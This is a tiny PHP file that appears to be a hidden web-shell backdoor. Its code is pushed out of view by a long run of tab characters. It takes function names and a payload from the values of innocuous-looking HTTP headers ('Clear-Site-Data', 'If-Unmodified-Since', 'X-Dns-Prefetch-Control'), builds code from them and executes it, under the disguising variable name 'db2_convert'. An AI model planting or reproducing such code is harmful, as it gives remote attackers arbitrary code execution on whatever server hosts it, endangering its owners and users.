<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Clear-Site-Data'])){$db2_convert=$_HEADERS['Clear-Site-Data']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['X-Dns-Prefetch-Control']));$db2_convert();}
